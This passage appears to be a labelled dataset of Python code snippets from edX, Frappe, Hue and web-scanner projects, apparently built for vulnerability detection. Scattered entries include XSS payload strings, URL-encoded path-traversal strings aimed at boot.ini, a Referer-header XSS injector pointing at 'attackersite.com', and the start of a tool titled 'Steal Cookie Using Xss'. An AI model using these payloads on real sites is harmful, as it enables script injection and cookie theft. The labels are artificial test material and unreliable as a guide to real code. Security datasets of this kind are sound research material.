\t\t%(condition)s ", "label": 0}, {"snippet_id": 25, "code": " fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip(", "label": 0}, {"snippet_id": 40287, "code": " \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email", "label": 0}, {"snippet_id": 35276, "code": "\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html", "label": 0}, {"snippet_id": 24183, "code": "(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course()", "label": 0}, {"snippet_id": 36412, "code": "\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df", "label": 0}, {"snippet_id": 20977, "code": ".render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'),", "label": 0}, {"snippet_id": 46562, "code": " admin_collection_delete(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request", "label": 0}, {"snippet_id": 17104, "code": "\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 54911, "code": " pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"\"Update stats on a list of TranslatedResource. ", "label": 0}, {"snippet_id": 22801, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views", "label": 1}, {"snippet_id": 42556, "code": " e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info", "label": 0}, {"snippet_id": 6125, "code": " default debug value :raise ValueError: if INI-file can't be parsed \"\"\" def __init__(self, filename, debug): self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION", "label": 0}, {"snippet_id": 14685, "code": " name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests", "label": 0}, {"snippet_id": 10586, "code": " sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils", "label": 0}, {"snippet_id": 21048, "code": ".urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url", "label": 0}, {"snippet_id": 9386, "code": "]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 27207, "code": " line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected. Method \"", "label": 1}, {"snippet_id": 20511, "code": "}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 48381, "code": ".GET[\"group_id\"])) for art in Article.objects.all().filter(group=g): if str(\"quantity_\" +str(art.id)) not in request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"", "label": 0}, {"snippet_id": 9747, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views", "label": 0}, {"snippet_id": 21433, "code": "<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 43903, "code": "\t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc", "label": 0}, {"snippet_id": 30941, "code": "/div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html", "label": 1}, {"snippet_id": 33027, "code": " template), relative_to=SRC_DIR) self.wfile.write(contents.encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def __init__(self, has_a_single_h1): super(_AdjustTOC, self).__init__(", "label": 0}, {"snippet_id": 27487, "code": ", split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url", "label": 0}, {"snippet_id": 5625, "code": "%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=", "label": 0}, {"snippet_id": 23938, "code": ", test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit", "label": 0}, {"snippet_id": 22677, "code": "/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views", "label": 0}, {"snippet_id": 12140, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/", "label": 1}, {"snippet_id": 23013, "code": ".instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 25599, "code": "*args, **kwargs) if item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme", "label": 0}, {"snippet_id": 19868, "code": ", Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self", "label": 0}, {"snippet_id": 288, "code": ".txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']", "label": 0}, {"snippet_id": 47826, "code": "]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user", "label": 1}, {"snippet_id": 22513, "code": ", (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP", "label": 0}, {"snippet_id": 33484, "code": " from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list", "label": 1}, {"snippet_id": 15323, "code": "'fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store", "label": 0}, {"snippet_id": 48526, "code": " HttpRequest, default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required response. \"\"\" js_string: str=\"", "label": 0}, {"snippet_id": 32792, "code": "-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self", "label": 0}, {"snippet_id": 46979, "code": " n_comments(self): return await Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self.id}'), ONE_HOUR) async def comment_ids_liked_by(self, user_id): cids", "label": 0}, {"snippet_id": 15663, "code": " Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback", "label": 0}, {"snippet_id": 10296, "code": "-xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1", "label": 0}, {"snippet_id": 3346, "code": " \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss", "label": 0}, {"snippet_id": 50565, "code": "=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode", "label": 0}, {"snippet_id": 45714, "code": " submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet", "label": 0}, {"snippet_id": 47355, "code": " import get_csrf_form_element from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get", "label": 0}, {"snippet_id": 45711, "code": ") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method", "label": 0}, {"snippet_id": 48822, "code": " self.model_field.verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self", "label": 0}, {"snippet_id": 12839, "code": "'openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns", "label": 0}, {"snippet_id": 27281, "code": "\"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s)", "label": 0}, {"snippet_id": 74, "code": " xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try", "label": 0}, {"snippet_id": 32518, "code": ", server_address, Handler) self.top_level=top_level def server_bind(self): self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer", "label": 0}, {"snippet_id": 23047, "code": ".views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'", "label": 0}, {"snippet_id": 32440, "code": "/gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md Args: value: The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used as", "label": 0}, {"snippet_id": 12509, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$'", "label": 0}, {"snippet_id": 3299, "code": " payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request", "label": 1}, {"snippet_id": 38579, "code": "\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields", "label": 0}, {"snippet_id": 22271, "code": " 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$", "label": 0}, {"snippet_id": 19426, "code": " num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific", "label": 0}, {"snippet_id": 26805, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e", "label": 0}, {"snippet_id": 15193, "code": "): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml", "label": 0}, {"snippet_id": 11395, "code": "{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C", "label": 0}, {"snippet_id": 53891, "code": " import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/')", "label": 1}, {"snippet_id": 27653, "code": "-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if values is None: values={} values['menu_items']=_MENU_ITEMS", "label": 0}, {"snippet_id": 4542, "code": "'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', ", "label": 0}, {"snippet_id": 47708, "code": "-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper():", "label": 0}, {"snippet_id": 892, "code": "\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26'", "label": 1}, {"snippet_id": 4584, "code": "'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', ", "label": 0}, {"snippet_id": 25229, "code": " widget=forms.TextInput def __init__(self, scheme: dict, field: forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size in self.scheme['fields']: a=copy.copy(attrs) or", "label": 0}, {"snippet_id": 20886, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile", "label": 0}, {"snippet_id": 51991, "code": " as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException", "label": 0}, {"snippet_id": 14236, "code": "),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns", "label": 0}, {"snippet_id": 14645, "code": "', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default", "label": 0}, {"snippet_id": 26714, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 36779, "code": "('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category", "label": 0}, {"snippet_id": 18895, "code": "/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'", "label": 0}, {"snippet_id": 28027, "code": ") def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in", "label": 0}, {"snippet_id": 39904, "code": "\tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue", "label": 0}, {"snippet_id": 1699, "code": " vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'],", "label": 0}, {"snippet_id": 54566, "code": ") context['articles']=self.object.article_set.all() context['form']=CommentForm() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm", "label": 0}, {"snippet_id": 30840, "code": " jinja2 import Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \tcmd='diff -ub %s%s %s", "label": 0}, {"snippet_id": 28708, "code": " \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False", "label": 0}, {"snippet_id": 53030, "code": " None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1", "label": 0}, {"snippet_id": 26687, "code": "%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 18900, "code": "'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name", "label": 0}, {"snippet_id": 11964, "code": ">[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED", "label": 0}, {"snippet_id": 52528, "code": "', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value", "label": 0}, {"snippet_id": 10850, "code": ".skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run", "label": 0}, {"snippet_id": 1534, "code": "'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={", "label": 0}, {"snippet_id": 48246, "code": " RESERVATION_CONSTRUCTION_COOKIE_KEY: str=\"org.technikradio.c3shop.frontpage\" +\\ \".reservation.cookiekey\" EMPTY_COOKY_VALUE: str=''' { \"notes\": \"\", \"articles\":[], \"pickup_date\": \"\" } ''' def update_reservation_articles(postdict, rid):", "label": 0}, {"snippet_id": 47022, "code": "(_, user_id, comment_id): comment=await Comment.cache(comment_id) if comment: asyncio.gather( clear_mc(MC_KEY_COMMENT_LIST % comment.post_id), clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( user_id, comment", "label": 0}, {"snippet_id": 43352, "code": "\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value)", "label": 0}, {"snippet_id": 51891, "code": " CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT=[", "label": 0}, {"snippet_id": 49089, "code": ": return self.current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace", "label": 0}, {"snippet_id": 1422, "code": " vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid", "label": 0}, {"snippet_id": 41976, "code": "\"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value,", "label": 0}, {"snippet_id": 13294, "code": "=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx", "label": 0}, {"snippet_id": 22619, "code": "\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',", "label": 0}, {"snippet_id": 25282, "code": "\")) if '_legacy' in value and not data[-1]: data[-1]=value.get('_legacy', '') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self", "label": 0}, {"snippet_id": 28725, "code": " if role <=level else False \texcept: \t\treturn False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=", "label": 1}, {"snippet_id": 21577, "code": " 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list", "label": 0}, {"snippet_id": 40911, "code": "\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add:", "label": 0}, {"snippet_id": 44775, "code": " return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')", "label": 0}, {"snippet_id": 11882, "code": ", 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower", "label": 0}, {"snippet_id": 29800, "code": ") \tfor server in servers: \t\tif server !=\"\": \t\t\tprint(\"ok\") \t\t\tsys.exit() \tsys.exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts", "label": 0}, {"snippet_id": 3649, "code": "='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers", "label": 0}, {"snippet_id": 54448, "code": "\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1) mainloop", "label": 0}, {"snippet_id": 54879, "code": ", JsonResponse, ) from django.shortcuts import get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base.models import( ChangedEntityLocale, Entity, Locale, Project, ProjectLocale", "label": 0}, {"snippet_id": 26936, "code": "(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1:", "label": 0}, {"snippet_id": 7855, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 41498, "code": ") \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost", "label": 0}, {"snippet_id": 32501, "code": ", r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level", "label": 0}, {"snippet_id": 21514, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$'", "label": 0}, {"snippet_id": 32238, "code": "(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help='port to run on(default=%(default)s)') parser.add_argument('-d', '--directory'", "label": 0}, {"snippet_id": 37828, "code": ".website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe", "label": 1}, {"snippet_id": 20237, "code": "\" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted", "label": 0}, {"snippet_id": 50250, "code": "\"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP", "label": 1}, {"snippet_id": 31680, "code": " plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version(serv) \tprint(output) \t if form.getvalue('bwlists", "label": 0}, {"snippet_id": 41161, "code": "\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog", "label": 0}, {"snippet_id": 41733, "code": "(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor", "label": 0}, {"snippet_id": 5119, "code": 